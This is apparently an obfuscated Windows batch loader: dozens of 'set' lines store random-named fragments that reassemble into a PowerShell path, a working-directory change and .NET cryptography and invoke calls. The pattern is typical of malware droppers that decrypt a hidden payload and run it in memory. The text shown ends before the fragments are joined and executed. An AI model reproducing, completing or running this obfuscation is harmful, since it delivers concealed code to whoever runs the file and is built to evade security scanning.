@echo off
set "togfJteTst=ll"
set "ioSleVvWKD=py"
set "oUCOPGePxr=ws"
set "ttwQrsQGDW=we"
set "BpKagJDckE=we"
set "JwfGYnyQue=em"
set "KimKLmfJUm=do"
set "yMgpXaBTWE=he"
set "YUKYVKXnTY=nd"
set "gmUbeUVNul=in"
set "dJFLqwnKAR=:\"
set "WKtfNVeyfl=y "
set "ILwTERQKrN=s\"
set "MDHIkLgzaH=.e"
set "PxlBPeEtqL=\v"
set "BmZfUmJgly=rS"
set "rEylYHrTcN=Po"
set "JPUzcpFSma=0\"
set "PfqcUgJbMe=he"
set "TmVgHphQbb=32"
set "iKgFkBWKBu= /"
set "OhqNrPjudf=xe"
set "OXKOIsUPnP=po"
set "QdQkNaDMyz=rs"
set "qausyiYGPF=Sy"
set "UlGhSUxMwx=ll"
set "AcrpiHVUri=\W"
set "YUeaPsDaoG=Wi"
set "MVLhfTbJZx= C"
set "FJvZSqmiYo=co"
set "yaQCBvLEQq=st"
set "XlIEXndtVl=1."
set "pCjAkzJhVH=ow"
set "tXaekGmygk=cd"
set "ArwyjIroYI= %~dp0"
set "iWXKjrIzAh=New-"
set "koUZcVBSGN=O = "
set "YchbNZCYoc=Secu"
set "nWqSPHGFrN=]::N"
set "nxomtHixok=morF"
set "jFRtYKMhLx=:: '"
set "ixHTvMQZUB=orF'"
set "aBeGaYBFqq=BS.T"
set "DvcevrFlUG=Invo"
set "boGqTwnupC=;$pn"
set "AittXPsUuE=6esa"
set "fpgHguovIX= = $"
set "dNJuUQXwcs=eam("
set "ZtOhtsecSo=k; }"
set "yyZaRAcOTJ= New"
set "OMCkliHOuL=g = "
set "mBIqxnpiHM=stem"
set "xtFJDOXtxs=ert]"
set "vlwlpxoaFH=tem."
set "QemWGTmUjx=EfoS"
set "wwMBhOyDDs=[Sys"
set "oLTFWIyIDn=in $"
set "WmNqjrlKzX=O, 0"
set "VArWQXcyxz=urit"
set "gYgdVftrDm=EJBM"
set "LBynvuZxPn=EfoS"
set "QIPUHmAETQ= [Sy"
set "uAxVswRPhY=d;$P"
set "VnmwWKXgog=rans"
set "jUCqmGrrJH=+hAO"
set "BNvOZDVarX=$Efo"
set "VmnoKFoWCh=yste"
set "IagsukaXwO=BC;$"
set "zFtbfnZLnz=ct S"
set "mLtiMhXCJk= [st"
set "krzDphvyNu=]::("
set "XzFJEzptwM='[-1"
set "ZMhhXojvlx=$PYa"
set "lLBzOCSGhx=[Sys"
set "UpoMwDepdO=;$Ve"
set "CKRMNSwFrT=yste"
set "EmsTcQeRzd=h) {"
set "OpZAGekzFt=]::("
set "VGdPhLXQVU=)))"
set "qVIFPrdTme=($mw"
set "EtNObiylPs=fore"
set "dawwxctaCg=lhj."
set "GltLwXwagZ=isfL"
set "FvfstkEBHE=:('g"
set "ZTsfhUOelY=raph"
